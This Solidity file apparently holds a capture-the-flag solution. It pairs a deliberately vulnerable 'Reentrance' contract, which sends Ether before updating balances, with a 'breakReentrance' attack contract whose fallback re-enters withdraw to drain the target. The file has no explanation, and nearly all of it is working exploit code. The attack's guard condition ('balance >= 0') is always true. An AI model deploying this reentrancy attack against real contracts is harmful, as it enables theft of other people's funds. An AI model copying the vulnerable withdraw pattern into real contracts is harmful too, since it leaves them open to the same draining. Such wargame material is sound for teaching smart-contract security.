// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract breakReentrance {
    Reentrance private immutable target;

    constructor(address payable _target) public { 
        target = Reentrance(_target);
    }

    function attack() external payable {
        target.donate{value: 0.001 ether, gas: 40000000}(address(this));
        target.withdraw(0.0005 ether);
    }

    fallback() external payable {
        if (address(target).balance >= 0) {
            target.withdraw(0.0005 ether);
        }
    }
}